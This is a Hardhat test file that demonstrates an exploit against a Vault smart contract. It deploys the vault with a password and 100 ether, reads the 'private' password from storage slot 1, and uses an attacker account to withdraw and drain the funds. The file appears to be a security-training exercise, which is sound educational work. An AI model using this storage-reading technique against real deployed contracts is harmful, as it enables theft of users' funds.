
const { expect } = require("chai");
const {ethers} = require("hardhat");

describe("Access control", function () {
  let attacker, deployer , agreedPrice
 beforeEach( async () =>{
 
    [deployer,attacker,user] = await ethers.getSigners();
  const Vault = await ethers.getContractFactory("Vault",deployer);
   this.vault= await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));
   await this.vault.deposite({value : ethers.utils.parseEther('100')})
})
 

  it("should able to access private variable  ",async () => {
    let intialAttackerBalance = await ethers.provider.getBalance(attacker.address)
    let intialValutBalance = await ethers.provider.getBalance(this.vault.address)

    console.log("Intial Attacker Balance",ethers.utils.formatEther(intialAttackerBalance))
    console.log("Intial Vault Balance",ethers.utils.formatEther(intialValutBalance))

    const pwd = await ethers.provider.getStorageAt(this.vault.address,1)
    let password = ethers.utils.parseBytes32String(pwd)
    console.log("PASSWORD :", password)
    await this.vault.connect(attacker).withdraw(pwd)


    let finalAttackerBalance = await ethers.provider.getBalance(attacker.address)
    let finalValutBalance = await ethers.provider.getBalance(this.vault.address)

    console.log("Final Attacker Balance",ethers.utils.formatEther(finalAttackerBalance))
    console.log("Final Vault Balance",ethers.utils.formatEther(finalValutBalance))

    expect(finalValutBalance).to.eq(0);
    expect(finalAttackerBalance).to.gt(intialAttackerBalance)

  })
  
})

   
 

 


